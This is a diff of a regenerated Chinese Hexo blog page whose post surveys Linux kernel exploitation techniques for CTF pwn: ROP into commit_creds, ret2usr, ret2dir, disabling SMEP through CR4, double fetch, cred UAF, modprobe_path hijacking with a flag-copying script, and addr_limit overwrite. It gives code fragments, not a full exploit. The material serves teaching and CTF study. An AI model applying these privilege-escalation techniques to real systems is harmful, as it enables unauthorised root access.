@@ -16,7 +16,7 @@
 
 <html class="theme-next mist use-motion" lang="zh-CN">
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="ROP12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态getsh">
+  <meta name="description" content="ROP 12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态g">
 <meta name="keywords" content="Linux-kernel">
 <meta property="og:type" content="article">
 <meta property="og:title" content="IS-pwn-Linux-kernel-常见漏洞利用">
 <meta property="og:url" content="https://hitworld.github.io/posts/5b0114cb/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="ROP12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态getsh">
+<meta property="og:description" content="ROP 12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态g">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2020-08-09T06:34:17.810Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IS-pwn-Linux-kernel-常见漏洞利用">
-<meta name="twitter:description" content="ROP12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态getsh">
+<meta name="twitter:description" content="ROP 12int commit_creds(struct cred * new);struct cred * prepare_kernel_cred(struct task_struct * daemon); 通过栈溢出漏洞写入ROP链调用commit_creds(prepare_kernel_cred(0))等函数进行提权,首先要泄露内核基址. 与用户态栈溢出不同的是这里需要返回用户态g">
 
 
 
@@ -185,7 +185,7 @@
       .logo-line-after i { right: initial; }
     }
   </style>
-</noscript>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </head>
 
@@ -196,7 +196,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -537,35 +537,44 @@
       
 
       
-        <h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred * <span class="keyword">new</span>)</span></span>;</span><br><span class="line"><span class="function">struct cred * <span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct * daemon)</span></span>;</span><br></pre></td></tr></table></figure>
+        <h2 id="rop">ROP</h2>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred * <span class="keyword">new</span>)</span></span>;</span><br><span class="line"><span class="function">struct cred * <span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct * daemon)</span></span>;</span><br></pre></td></tr></table></figure>
 <p>通过栈溢出漏洞写入<code>ROP</code>链调用<code>commit_creds(prepare_kernel_cred(0))</code>等函数进行提权,首先要泄露内核基址.</p>
 <p>与用户态栈溢出不同的是这里需要返回用户态<code>getshell</code>(如果开了<code>SMEP</code>),也就是要通过<code>ROP</code>模拟内核态退出到用户态的流程.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">        <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">        <span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="string">"popq %2\n"</span></span><br><span class="line">        :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">"memory"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈排布.</span></span><br><span class="line"><span class="comment">// &amp;set_uid</span></span><br><span class="line"><span class="comment">// swapgs_pop_ebp_ret</span></span><br><span class="line"><span class="comment">// rbp(padding)</span></span><br><span class="line"><span class="comment">// iret_addr</span></span><br><span class="line"><span class="comment">// &amp;getshell</span></span><br><span class="line"><span class="comment">// user_cs</span></span><br><span class="line"><span class="comment">// user_rflags</span></span><br><span class="line"><span class="comment">// user_rsp</span></span><br><span class="line"><span class="comment">// user_ss</span></span><br></pre></td></tr></table></figure>
-<h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><p><code>ret2usr</code>攻击利用用户空间的进程不能访问内核空间,但内核空间能访问用户空间的特性来定向内核代码或数据流指向用户空间,以<code>Ring 0</code>特权执行用户空间代码完成提权等操作.</p>
+<h2 id="ret2usr">ret2usr</h2>
+<p><code>ret2usr</code>攻击利用用户空间的进程不能访问内核空间,但内核空间能访问用户空间的特性来定向内核代码或数据流指向用户空间,以<code>Ring 0</code>特权执行用户空间代码完成提权等操作.</p>
 <p>可以直接<code>ROP</code>劫持控制流返回到用户空间代码提权.也可以利用<code>tty_struct</code>结构体的<code>ops</code>函数表劫持控制流,因为<code>rax</code>中存储着伪造的函数表指针,通过<code>mov rsp, rax</code>,<code>xchg rsp, rax</code>这种<code>ROPgadget</code>即可将栈转换到用户态来构造<code>ROP</code>.</p>
-<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><p><code>linux</code>内核在设计的时候,为了提高内存的操作效率,在用户空间映射内存的时候,内核也相应地在内核的低端内存区地址映射一段影子内存.</p>
+<h2 id="ret2dir">ret2dir</h2>
+<p><code>linux</code>内核在设计的时候,为了提高内存的操作效率,在用户空间映射内存的时候,内核也相应地在内核的低端内存区地址映射一段影子内存.</p>
 <p>攻击者可以将用户空间的攻击代码映射到内核的低端内存可执行区或者将特定数据进行喷射到内核的低端内存,进行内存布局,然后利用漏洞让内核执行攻击代码,从而达到提权的目的,这项技术在<code>32</code>位<code>arm</code>设备上有<code>60%</code>以上的成功率,而在<code>64</code>位<code>arm</code>中有<code>96%</code>的成功率.</p>
 <p><code>2016</code>年<code>7</code>月<code>google</code>在<code>android PIXEL</code>(内核<code>3.18-16.04</code>)版本以后封杀了<code>ret2dir</code>的攻击方式.</p>
 <p>不过现在又出现了<code>vDSO</code>重写这种利用方式.</p>
-<h2 id="修改CR4寄存器bypass-smep"><a href="#修改CR4寄存器bypass-smep" class="headerlink" title="修改CR4寄存器bypass-smep"></a>修改CR4寄存器bypass-smep</h2><p><code>smep</code>(<code>Supervisor Mode Execution Protection</code>)是内核的一种保护措施,作用是当<code>CPU</code>处于<code>Ring 0</code>模式时,执行用户空间代码会触发页错误,这个保护在<code>ARM</code>中被称为<code>PXN</code>.可以通过<code>grep smep /proc/cpuinfo</code>检测该保护是否开启.</p>
+<h2 id="修改cr4寄存器bypass-smep">修改CR4寄存器bypass-smep</h2>
+<p><code>smep</code>(<code>Supervisor Mode Execution Protection</code>)是内核的一种保护措施,作用是当<code>CPU</code>处于<code>Ring 0</code>模式时,执行用户空间代码会触发页错误,这个保护在<code>ARM</code>中被称为<code>PXN</code>.可以通过<code>grep smep /proc/cpuinfo</code>检测该保护是否开启.</p>
 <p>系统根据<code>CR4</code>寄存器的值判断是否开启<code>smep</code>保护,当<code>CR4</code>寄存器的第<code>20</code>位是<code>1</code>时,保护开启;为<code>0</code>时关闭.而<code>CR4</code>寄存器是可以通过<code>mov</code>指令修改的.</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span><span class="comment">;0x6f0</span></span><br><span class="line"><span class="keyword">ret</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cr4</span>, <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure>
 <p>关闭<code>smep</code>后就可以使用常规的<code>ret2usr</code>攻击.</p>
-<h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><p><code>Double Fetch</code>从漏洞原理上属于条件竞争漏洞,是一种内核态与用户态之间的数据访问竞争.</p>
+<h2 id="double-fetch">Double Fetch</h2>
+<p><code>Double Fetch</code>从漏洞原理上属于条件竞争漏洞,是一种内核态与用户态之间的数据访问竞争.</p>
 <p>一个典型的<code>Double Fetch</code>漏洞:一个用户态线程准备数据并通过系统调用进入内核,该数据在内核中有两次被取用,内核第一次取用数据进行安全检查,当检查通过后内核第二次取用数据进行实际处理.而在两次取用数据之间,另一个用户态线程可创造条件竞争,对已通过检查的用户态数据进行篡改,在真实使用时造成访问越界或缓冲区溢出.</p>
-<h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>内核态的堆管理机制不太一样,但原理类似.由于<code>cred</code>结构体是使用<code>kmem_cache_alloc</code>分配的,所以可以通过申请相同大小的内存获取<code>cred</code>从而篡改<code>cred</code>.</p>
-<h2 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h2><p>当内核运行一个错误格式的文件的时候,会调用这个<code>modprobe_path</code>所指向的二进制文件.可以通过劫持这个指针来运行恶意文件.</p>
+<h2 id="uaf">UAF</h2>
+<p>内核态的堆管理机制不太一样,但原理类似.由于<code>cred</code>结构体是使用<code>kmem_cache_alloc</code>分配的,所以可以通过申请相同大小的内存获取<code>cred</code>从而篡改<code>cred</code>.</p>
+<h2 id="modprobe_path">modprobe_path</h2>
+<p>当内核运行一个错误格式的文件的时候,会调用这个<code>modprobe_path</code>所指向的二进制文件.可以通过劫持这个指针来运行恶意文件.</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep modprobe_path</span><br><span class="line"><span class="comment">#root</span></span><br></pre></td></tr></table></figure>
 <p>创建目标可执行文件.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/copy.sh"</span>);</span><br><span class="line">system(<span class="string">"echo -ne '\\xff\\xff\\xff\\xff' &gt; /home/pwn/w4rd3n"</span>);</span><br><span class="line">system(<span class="string">"chmod +x /home/pwn/w4rd3n"</span>);</span><br></pre></td></tr></table></figure>
 <p>劫持<code>modprobe_path</code>到可执行文件<code>/home/pwn/copy.sh</code>后就可以触发并获取<code>flag</code>.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/home/pwn/w4rd3n"</span>);</span><br><span class="line">system(<span class="string">"cat /home/pwn/flag"</span>);</span><br></pre></td></tr></table></figure>
-<h2 id="thread-info-gt-addr-limit"><a href="#thread-info-gt-addr-limit" class="headerlink" title="thread_info-&gt;addr_limit"></a>thread_info-&gt;addr_limit</h2><p><code>thread_info-&gt;addr_limit</code>用于限制用户态程序能访问的地址的最大值,如果把它修改成<code>0xffffffffffffffff</code>就可以利用<code>pipe</code>读写整个内存空间,包括内核空间.</p>
+<h2 id="thread_info-addr_limit">thread_info-&gt;addr_limit</h2>
+<p><code>thread_info-&gt;addr_limit</code>用于限制用户态程序能访问的地址的最大值,如果把它修改成<code>0xffffffffffffffff</code>就可以利用<code>pipe</code>读写整个内存空间,包括内核空间.</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//pipe(pipefd)初始化</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmemcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">void</span> *src, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    write(pipefd[<span class="number">1</span>], src, size);</span><br><span class="line">    read(pipefd[<span class="number">0</span>], dest, size);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果是泄露内核数据的话,dest为内核地址,src为内核地址,同时要关闭smap.</span></span><br><span class="line"><span class="comment">//如果是对内核数据进行写操作,dest为内核地址,src为用户态地址.</span></span><br></pre></td></tr></table></figure>
 <p><code>thread_info</code>位于内核栈顶部而且是<code>THREAD_SIZE</code>对齐的,<code>THREAD_SIZE</code>可以为<code>4k</code>,<code>8k</code>或者是<code>16k</code>,利用<code>stack_addr &amp; (~(THREAD_SIZE - 1))</code>就可以计算出<code>thread_info</code>的地址.</p>
 <p>通过<code>thread_info</code>的地址可以拿到<code>task_struct</code>(<code>thread_info-&gt;task</code>)的地址,进一步获取<code>task_struct-&gt;real_cred</code>和<code>task_struct-&gt;cred</code>的地址,修改<code>task_struct-&gt;real_cred</code>一直到 <code>fsuid</code>字段为<code>0</code>,修改<code>task_struct-&gt;cred</code>为<code>task_struct-&gt;real_cred</code>从而提权.</p>
 <p>在内核中<code>set_fs</code>是一个用于设置<code>thread_info-&gt;addr_limit</code>的宏,利用这个,再加上一些条件,可以直接修改<code>thread_info-&gt;addr_limit</code>.</p>
-<h2 id="总结可劫持的变量"><a href="#总结可劫持的变量" class="headerlink" title="总结可劫持的变量"></a>总结可劫持的变量</h2><p><code>modprobe_path</code>,通过执行错误格式的<code>elf</code>文件来触发.</p>
+<h2 id="总结可劫持的变量">总结可劫持的变量</h2>
+<p><code>modprobe_path</code>,通过执行错误格式的<code>elf</code>文件来触发.</p>
 <p><code>poweroff_cmd</code>,执行<code>__orderly_poweroff()</code>即可.</p>
 <p><code>uevent_helper</code>,<code>ocfs2_hb_ctl_path</code>,<code>nfs_cache_getent_prog</code>,<code>cltrack_prog</code>.</p>
 
@@ -882,7 +891,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">1.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">2.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-number">3.</span> <span class="nav-text">ret2dir</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改CR4寄存器bypass-smep"><span class="nav-number">4.</span> <span class="nav-text">修改CR4寄存器bypass-smep</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Double-Fetch"><span class="nav-number">5.</span> <span class="nav-text">Double Fetch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UAF"><span class="nav-number">6.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#modprobe-path"><span class="nav-number">7.</span> <span class="nav-text">modprobe_path</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thread-info-gt-addr-limit"><span class="nav-number">8.</span> <span class="nav-text">thread_info-&gt;addr_limit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结可劫持的变量"><span class="nav-number">9.</span> <span class="nav-text">总结可劫持的变量</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#rop"><span class="nav-number">1.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2usr"><span class="nav-number">2.</span> <span class="nav-text">ret2usr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-number">3.</span> <span class="nav-text">ret2dir</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改cr4寄存器bypass-smep"><span class="nav-number">4.</span> <span class="nav-text">修改CR4寄存器bypass-smep</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#double-fetch"><span class="nav-number">5.</span> <span class="nav-text">Double Fetch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uaf"><span class="nav-number">6.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#modprobe_path"><span class="nav-number">7.</span> <span class="nav-text">modprobe_path</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#thread_info-addr_limit"><span class="nav-number">8.</span> <span class="nav-text">thread_info-&gt;addr_limit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结可劫持的变量"><span class="nav-number">9.</span> <span class="nav-text">总结可劫持的变量</span></a></li></ol></div>
             
 
           </div>
@@ -914,7 +923,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">710k</span>
+    <span title="站点总字数">720k</span>
   
 
   
@@ -923,7 +932,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:46</span>
+    <span title="站点阅读时长">10:54</span>
   
 </div>
 
@@ -1574,5 +1583,5 @@
   
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 </html>
